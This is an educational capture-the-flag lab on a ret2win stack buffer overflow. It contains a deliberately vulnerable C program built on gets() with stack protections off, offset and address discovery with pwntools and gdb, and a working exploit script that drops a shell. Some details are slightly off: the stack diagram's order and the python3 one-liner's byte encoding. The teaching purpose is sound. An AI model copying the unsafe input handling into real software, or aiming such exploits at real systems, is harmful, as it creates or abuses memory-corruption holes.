Markdown# Lab 2: picoCTF-Style Buffer Overflow – ret2win Attack
**Time:** 40–50 minutes  
**Difficulty:** Beginner → Intermediate  
**Goal:** Overflow a buffer and redirect execution to a “win” function that is never called  
**Author:** Latha Shree K P  

---
## Introduction: Where We Are Now
### What You've Already Done
In the previous lab you learned the basics of buffer overflows:
- **Lab 1 (Protostar Stack0):** You overflowed a buffer and changed a nearby variable  
  → This taught you that overflowing affects adjacent memory

### What's New in This Lab
Now we go one step further and do something much more powerful: **take full control of where the program goes next**.

We will force the program to jump to a function called `win()` that exists in the code but is **never called normally**.  
This technique is called **ret2win** (return-to-win) and is the cleanest way to understand return address hijacking.

Think of it this way:
- Lab 1: You spilled water on the table (simple overflow)
- Lab 2: You told someone “go to the secret room instead” (control flow hijacking)

---
## Section 1: Understanding the Vulnerable Program
**Purpose of this section:** See exactly what we're attacking and why it's vulnerable.

### The Source Code
Here’s the full source code (`vuln.c`):
```c
#include <stdio.h>          // printf, puts, gets
#include <stdlib.h>         // system

void win() {                                      // This function is NEVER called normally
    puts("Congratulations! You redirected execution to win()");
    puts("This is a classic ret2win attack.");
    system("/bin/sh");                            // Bonus: drops a shell
}

void vulnerable() {
    char buffer[32];                              // Only 32 bytes of space
    puts("What's your name?");
    gets(buffer);                                 // DANGEROUS – no bounds checking!
    printf("Hello, %s!\n", buffer);
}

int main() {
    setbuf(stdout, NULL);                         // Disable buffering → instant output
    setbuf(stdin, NULL);
    
    puts("Welcome to picoCTF-style Buffer Overflow 1");
    vulnerable();
    puts("Exiting normally...");
    return 0;
}
Breaking Down the Vulnerability
Line-by-line explanation:

char buffer[32]; → Only 32 bytes allocated
gets(buffer); → Reads unlimited input → classic stack buffer overflow
win() exists but is never called → perfect ret2win target!

Compilation command (already done):
Bashgcc -m32 -fno-stack-protector -no-pie -w -o vuln vuln.c

Section 2: Stack Layout (Visual Diagram)
Normal stack frame for vulnerable() function:
textHigher addresses
    │
    v
┌────────────────────────────────────┐
│ saved EBP                    (4B) │
├────────────────────────────────────┤
│ saved EIP ←←←←←←←←←←←←←←←←←←←←←←←←←←│ ← We overwrite THIS!
├────────────────────────────────────┤
│ buffer[31] … buffer[0]      (32B)│
└────────────────────────────────────┘
    ^
    │
Lower addresses (stack grows down)
We need exactly 44 bytes of input to reach and overwrite the saved return address.

Section 3: Finding the Exact Offset
Purpose: Find how many bytes we need to send before overwriting the return address.
Bash# Generate a unique pattern
python3 -c "from pwn import *; print(cyclic(100))" | ./vuln

# Program crashes → EIP = something like 0x61616168 ("aaah")
python3 -c "from pwn import *; print(cyclic_find(0x61616168))"
# → Returns 44
Final result: Offset = 44 bytes

Section 4: Finding the win() Function Address
Bashgdb -q vuln -ex "p win" -ex quit
Output on this VM:
text$1 = {<text variable, no debug info>} 0x8049186 <win>
win() address = 0x8049186
Little-endian: \x86\x91\x04\x08

Section 5: Building the Exploit
Payload Structure (48 bytes total)
text┌─────────────────────────────────────────────────────┐
│ Bytes 0–43: Padding ("A" × 44)                     │ ← Fill buffer + saved EBP
├─────────────────────────────────────────────────────┤
│ Bytes 44–47: \x86\x91\x04\x08                        │ ← win() address
└─────────────────────────────────────────────────────┘
Quick One-Liner Test
Bash(python3 -c "print('A'*44 + '\x86\x91\x04\x08')"; cat) | ./vuln
Full Exploit Script (fully commented)
Create exploit_picoctf.py:
Python#!/usr/bin/env python3
from pwn import *                               # Import pwntools

p = process("./vuln")                           # Start the vulnerable program

win_addr = 0x8049186                            # Address of win() on this VM

payload  = b"A" * 44                            # 44 bytes padding → reaches saved EIP
payload += p32(win_addr)                        # Overwrite return address with win()
                                                # p32() packs in little-endian

p.sendline(payload)                             # Send the payload
p.interactive()                                 # Drop into the shell
Run:
Bashpython3 exploit_picoctf.py
→ Success message + shell!

Section 6: What Actually Happens? (Attack Timeline)
textSTEP 1: vulnerable() called → normal stack
STEP 2: We send 48 bytes → overwrite saved EIP with 0x8049186
STEP 3: vulnerable() returns → CPU pops 0x8049186 as next instruction address
STEP 4: Execution jumps straight to win() → prints message + spawns shell
Result: You now fully control the program flow!

Section 7: Troubleshooting Guide

ProblemSolutionImmediate segfaultWrong offset → recalculate with cyclic / cyclic_findProgram crashes after a few bytesWrong win() address → re-run gdb -q vuln -ex "p win" -ex quitAddress changes every runBinary compiled with PIE → recompile using -no-pieNo output / program hangsMake sure binary is named vuln and you are in the correct directory

Section 8: Mini Exercises

Edit win() to print your name → recompile → update address → run exploit
Comment out system("/bin/sh"); → re-run → see that you still reach win()


Quick Reference Card
Bash# Offset
python3 -c "from pwn import *; print(cyclic_find(0x61616168))"   # → 44

# win() address
gdb -q vuln -ex "p win" -ex quit                                  # → 0x8049186

# One-liner
(python3 -c "print('A'*44 + '\x86\x91\x04\x08')"; cat) | ./vuln

# Full script
python3 exploit_picoctf.py